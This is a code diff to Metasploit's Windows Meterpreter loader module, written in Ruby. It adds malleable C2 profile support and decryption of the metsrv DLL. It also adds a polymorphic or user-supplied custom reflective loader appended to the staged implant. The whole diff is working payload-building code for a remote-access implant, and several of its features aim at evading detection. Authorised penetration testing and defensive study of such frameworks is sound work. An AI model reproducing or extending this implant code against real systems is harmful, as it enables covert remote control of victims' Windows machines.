@@ -13,6 +13,7 @@ module Payload::Windows::MeterpreterLoader
 
   include Msf::ReflectiveDLLLoader
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::ReflectiveLoader
 
   def initialize(info = {})
     super(update_info(info,
@@ -71,7 +72,14 @@ module Payload::Windows::MeterpreterLoader
   def generate_config(opts={})
     ds = opts[:datastore] || datastore
     opts[:uuid] ||= generate_payload_uuid
-
+    # Pass the malleable C2 profile through to the transport config so
+    # that staged HTTP(S) meterpreter sessions honour the profile after
+    # the stage is delivered. The option is only registered by HTTP(S)
+    # stagers, so it's nil (and ignored) for other transports.
+    opts[:c2_profile] ||= ds['MALLEABLEC2'] if options.include?('MALLEABLEC2')
+    if opts[:c2_profile]
+      opts[:stageless] = true
+    end
     # create the configuration block, which for staged connections is really simple.
     config_opts = {
       arch:              opts[:uuid].arch,
@@ -81,27 +89,68 @@ module Payload::Windows::MeterpreterLoader
       uuid:              opts[:uuid],
       transports:        opts[:transport_config] || [transport_config(opts)],
       extensions:        [],
+      ext_format:        'x86.dll',
       stageless:         opts[:stageless] == true,
     }.merge(meterpreter_logging_config(opts))
     # create the configuration instance based off the parameters
     config = Rex::Payloads::Meterpreter::Config.new(config_opts)
 
-    # return the binary version of it
-    config.to_b
+    # return the binary version of it, prefixed with an 8-byte comms handle
+    # that the stager patches with the active socket/handle
+    "\x00" * 8 + config.to_b
   end
 
   def stage_meterpreter(opts={})
     ds = opts[:datastore] || datastore
     debug_build = ds['MeterpreterDebugBuild']
-    # Exceptions will be thrown by the mixin if there are issues.
-    dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll', debug: debug_build))
+    loader = nil
+    dll_path = MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll', debug: debug_build)
+    dll = ::MetasploitPayloads::Crypto.decrypt(ciphertext: ::File.binread(dll_path))
+    begin
+      rdi_offset = parse_pe(dll)
+    rescue Rex::PeParsey::PeError => e
+      elog("Failed to parse metsrv (x86) as a PE, falling back to the polymorphic loader: #{e.class}: #{e.message}")
+      rdi_offset = nil
+    end
+
+    # Prefer a site-local custom loader binary if the user has dropped one into
+    # the meterpreter search paths (~/.msf4/user_data/meterpreter/ or
+    # <msf>/data/meterpreter/); otherwise assemble the polymorphic reflective
+    # loader on the fly.
+    custom_loader_path = [
+      ::MetasploitPayloads.user_meterpreter_dir,
+      ::MetasploitPayloads.msf_meterpreter_dir
+    ].map { |dir| ::File.join(dir, 'custom_loader.x86.bin') }.find { |p| ::File.readable?(p) }
+
+    use_loader = false
+    if custom_loader_path
+      loader = ::File.binread(custom_loader_path)
+      validate_custom_loader!(loader, custom_loader_path)
+      dlog("Using custom loader from #{custom_loader_path}")
+      ::MetasploitPayloads.warn_local_path(custom_loader_path)
+      use_loader = true
+    end
+
+    if rdi_offset.nil? && !use_loader
+      loader = reflective_loader(iv: datastore_reflective_loader_iv(ds))
+      use_loader = true
+    end
 
     asm_opts = {
-      rdi_offset: offset,
-      length:     dll.length,
+      # when a custom/polymorphic loader is appended, it must take priority over any
+      # ReflectiveLoader already embedded in the DLL, since that's the loader whose bytes
+      # actually follow the DLL in the payload
+      rdi_offset: use_loader ? dll.length : rdi_offset,
+      length:     dll.length + (loader ? loader.length : 0), # total payload length = DLL + reflective loader
       stageless:  opts[:stageless] == true
     }
 
+    dlog("Using custom loader from #{custom_loader_path}") if custom_loader_path
+    dlog('Using polymorphic reflective loader') if !custom_loader_path && use_loader
+    dlog("Loader length: #{loader.length} bytes") if use_loader
+    dlog("DLL length: #{dll.length} bytes")
+    dlog("ReflectiveLoader offset: #{asm_opts[:rdi_offset]} bytes")
+    dlog("Configuration offset: #{asm_opts[:length]} bytes")
     asm = asm_invoke_metsrv(asm_opts)
 
     # generate the bootstrap asm
@@ -114,7 +163,7 @@ module Payload::Windows::MeterpreterLoader
 
     # patch the bootstrap code into the dll's DOS header...
     dll[ 0, bootstrap.length ] = bootstrap
-
+    dll += loader if use_loader
     dll
   end
 
